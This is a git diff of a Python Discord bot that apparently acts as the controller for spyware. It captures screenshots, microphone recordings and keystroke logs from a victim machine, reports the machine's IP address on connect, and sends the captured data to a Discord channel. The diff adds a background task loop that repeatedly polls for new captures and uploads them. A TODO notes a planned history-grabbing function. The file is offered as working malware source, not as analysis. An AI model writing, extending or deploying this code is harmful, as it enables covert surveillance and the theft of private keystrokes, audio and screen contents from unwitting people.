@@ -1,5 +1,5 @@
 import discord, time, os, socket
-from discord.ext import commands
+from discord.ext import commands, tasks
 from screen import Screenshot, Microphone
 from dotenv import load_dotenv
 load_dotenv(".env")
@@ -63,6 +63,20 @@ async def sendLogs(ctx):
     with open(keylogs_file, "w") as f:
         f.write("")
             
+@tasks.loop(seconds=0.1)
+async def check_files(ctx):
+    while True:
+        for file in os.listdir("files"):
+            if file.endswith(".png"):
+                await sendScreen(ctx=ctx)
+            if file.endswith(".wav"):
+                await sendMic(ctx=ctx)
+            with open(keylogs_file, "r") as f:
+                logs = f.readlines()
+                for lines in logs:
+                    if "SEC: 5" in lines:
+                        await sendLogs(ctx=ctx)
+
 @bot.event
 async def on_ready():
     guild = await bot.fetch_guild(guild_id)
@@ -72,21 +86,14 @@ async def on_ready():
     ip_address = socket.gethostbyname(hostname)
 
     await channel.send(f"{ip_address} connected at {time.strftime('%m/%d %H:%M:%S')}")
+    check_files.start(guild)
 
 @bot.event
 async def on_message(message):
-    while True:
-        for file in os.listdir("files"):
-            if file.endswith(".png"):
-                await sendScreen(ctx=message)
-            if file.endswith(".wav"):
-                await sendMic(ctx=message)
-            with open(keylogs_file, "r") as f:
-                logs = f.readlines()
-                for lines in logs:
-                    if "SEC: 5" in lines:
-                        await sendLogs(ctx=message)
-
-        time.sleep(0.1)
+    if not message.author.bot and message.content.startswith(bot.command_prefix):
+        await bot.process_commands(message)
 
 bot.run(os.getenv("DISCORD_TOKEN"))
+
+# TODO:
+# - Add get_history function
